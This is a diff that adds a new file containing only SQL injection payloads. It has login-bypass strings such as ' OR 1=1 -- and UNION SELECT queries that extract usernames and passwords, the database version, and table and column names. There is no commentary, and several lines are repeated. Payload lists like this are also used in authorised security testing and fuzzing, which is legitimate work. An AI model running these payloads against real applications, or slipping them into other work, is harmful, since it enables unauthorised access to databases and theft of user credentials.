@@ -1,0 +1,21 @@
+' OR 1=1 --  
+' OR 1=1 --  
+' OR '1'='1  
+' OR "1"="1  
+') OR ('1'='1  
+' OR 1=1#  
+' OR 1=1#  
+' OR '1'='1#  
+' OR "1"="1#  
+' OR 1=1--  
+' OR 1=1--  
+' OR '1'='1--  
+' OR "1"="1"--  
+' UNION SELECT null, null, null --  
+' UNION SELECT null, null, null --  
+' UNION SELECT username, password FROM users --  
+' UNION SELECT username, password FROM users --  
+' UNION SELECT 1, @@version --  
+' UNION SELECT 1, @@version --  
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --  
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --  
